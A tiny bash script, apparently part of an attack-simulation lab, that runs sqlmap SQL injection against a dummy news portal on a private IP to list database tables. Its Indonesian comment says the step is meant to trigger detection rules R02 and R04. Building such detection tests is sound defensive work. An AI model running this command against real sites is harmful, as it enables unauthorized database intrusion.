#!/usr/bin/env bash
# Akses awal: SQL injection ke portal dummy (memicu R02 dan R04).
TARGET="${1:-172.30.0.11}"
sqlmap -u "http://$TARGET/berita.php?id=1" --batch --level 1 --risk 1 --technique=BEU --dbms=SQLite --tables
